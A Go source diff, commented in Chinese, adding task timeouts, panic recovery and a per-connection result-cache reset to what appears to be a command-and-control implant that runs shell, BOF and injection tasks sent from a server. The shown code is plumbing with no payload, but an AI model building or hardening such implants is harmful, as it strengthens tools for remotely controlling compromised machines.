@@ -485,6 +485,10 @@ func run() {
 	taskCh = make(chan Task, 16)
 	go taskWorker(gen)
 
+	// 每次新连接清空结果缓存：服务端重启后 task.ID 会重新从 1 开始分配，
+	// 若保留旧缓存，新任务的 task.ID 会命中旧结果，造成任务输出错位/乱序。
+	clearResultCache()
+
 	// 隧道数据帧批量写出：单 goroutine 合并多帧为一次 writev，消除每帧加锁与系统调用。
 	tunnelFrameCh = make(chan []byte, 8192)
 	writeWg.Add(1)
@@ -980,7 +984,7 @@ func executeAndSendResult(task Task, gen uint64) {
 		resultCacheMu.Unlock()
 	}
 
-	result := executeTask(task)
+	result := executeTaskWithTimeout(task)
 
 	// 连接已换代（run 返回重连中）：旧任务结果作废，服务端会重新下发
 	if connGen.Load() != gen {
@@ -1002,6 +1006,41 @@ func executeAndSendResult(task Task, gen uint64) {
 		os.Exit(0)
 	}
 }
+
+// executeTaskWithTimeout 执行任务并强制超时：任何任务（含 plugin_exe/BOF 等重活）
+// 最多运行 execTimeout，超时返回超时结果，绝不无限占住植入端 worker，
+// 否则后续任务会一直排队成 sent（植入端看似在线却不执行任务）。
+// 用 goroutine + select 实现超时（executeTask 是同步阻塞，无法 context 取消）。
+func executeTaskWithTimeout(task Task) Result {
+	ch := make(chan Result, 1)
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				ch <- Result{TaskID: task.ID, TaskType: task.TaskType, ExitCode: -1, Error: "task panic: " + fmt.Sprint(r)}
+			}
+		}()
+		ch <- executeTask(task)
+	}()
+
+	timeout := execTimeout
+	if isHeavyTask(task.TaskType) {
+		timeout = heavyExecTimeout
+	}
+	select {
+	case res := <-ch:
+		return res
+	case <-time.After(timeout):
+		return Result{TaskID: task.ID, TaskType: task.TaskType, ExitCode: -1,
+			Error: "task timed out after " + timeout.String(), Output: ""}
+	}
+}
+
+const (
+	// execTimeout 轻任务（command/shell 等）最大执行时长。
+	execTimeout = 90 * time.Second
+	// heavyExecTimeout 重活任务（plugin_exe/BOF/注入等）最大执行时长，略长。
+	heavyExecTimeout = 180 * time.Second
+)
 
 // isTransferTask 判断是否为依赖完整分块传输的任务（其结果不可跨断连缓存）。
 func isTransferTask(taskType string) bool {
@@ -1038,6 +1077,16 @@ func cacheResult(taskID uint64, payload []byte) {
 		resultCacheOrder = resultCacheOrder[1:]
 		delete(resultCache, oldest)
 	}
+}
+
+// clearResultCache 清空结果缓存。每次建立新连接时调用：
+// 服务端重启后 taskCounter 会从 1 重新分配 task.ID，若不清缓存，
+// 新任务的 task.ID 会命中旧会话缓存的错误结果 → 任务输出错位/乱序。
+func clearResultCache() {
+	resultCacheMu.Lock()
+	defer resultCacheMu.Unlock()
+	resultCache = nil
+	resultCacheOrder = nil
 }
 
 // resultCacheMax 结果缓存容量：覆盖心跳超时窗口内的任务数即可。
